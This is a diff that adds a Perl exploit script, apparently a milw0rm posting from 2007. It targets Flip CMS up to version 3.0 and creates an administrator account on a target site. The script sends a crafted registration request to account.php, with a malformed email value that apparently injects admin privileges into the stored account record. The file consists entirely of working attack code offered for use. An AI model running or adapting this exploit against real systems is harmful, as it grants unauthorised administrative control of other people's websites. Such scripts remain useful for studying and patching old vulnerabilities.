@@ -1,0 +1,106 @@
+#!/usr/bin/perl
+
+use strict; 
+use IO::Socket;
+use Getopt::Std;
+
+my $app = "Flip <= 3.0";
+my $type = "Admin Creation";
+my $author = "undefined1_";
+my $vendor = "http://sourceforge.net/projects/flipsource";
+
+my %opt;
+getopts("t:", \%opt);
+$| = 1;
+print ":: $app $type - by $author - www.undef1.com ::\n\n\n";
+
+my $url = $opt{t} || usage();
+
+if($url =~ m/^(?:http:\/\/)(.*)/) {
+	$url = $1;
+}
+if($url !~ m/^.*\/$/) {
+	$url .= "/";
+}
+
+print "username you want: ";
+my $user = <STDIN>;
+print "password you want: ";
+my $pass = <STDIN>;
+chomp($user);
+chomp($pass);
+
+create_admin($url, $user, $pass);
+
+sub create_admin {
+	my $url = shift;
+	my $user = shift;
+	my $pass = shift;
+	
+	print "creating admin ... \t";
+	my $content  = "un=$user&em=aaa][3\@gmail.com&pw1=$pass&pw2=$pass";
+	my $data = "POST " . parse_page($url . "account.php?op=register") . " HTTP/1.1\r\n";
+	$data .= "Host: " . parse_host($url) . "\r\n";
+	$data .= "Connection: close\r\n";
+	$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	$data .= "Content-Length: " . length($content) . "\r\n\r\n";
+	my $recv = sendpacket(parse_host($url), parse_port($url), $data.$content);
+
+	if($recv !~ m/Successfully registered!/m) {
+		print "failed\n";
+		return;
+	}	
+	print "OK\n";		
+}
+
+
+
+# ======================================================
+
+sub parse_host {
+	my $url = shift;
+	if($url =~ m/^([^\/:]+).*\//) {
+		return $1;
+}
+	return "127.0.0.1";
+}
+
+sub parse_port {
+	my $url = shift;
+	if($url =~ m/^(?:[^\/:]+):(\d+)\//) {
+		return $1;
+}
+	return "80";
+}
+
+sub parse_page {
+	my $url = shift;
+	if($url =~ m/^(?:[^\/]+)(\/.*)/) {
+		return $1;
+	}
+	return "/";
+}
+
+
+sub sendpacket {
+	my $server = shift;
+	my $port = shift;
+	my $data = shift;
+
+	my $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $server, PeerPort => $port) or die ":: Could not connect to $server:80 $!\n";
+	print $sock "$data";
+	
+	$data = "";
+	my $resp;
+	while($resp = <$sock>)	{ $data .= $resp; }
+	
+	close($sock);
+	return $data;
+}
+
+sub usage() {
+	printf "usage: %s -t<url>\n", $0;
+	exit;
+}
+
+# milw0rm.com [2007-09-20]
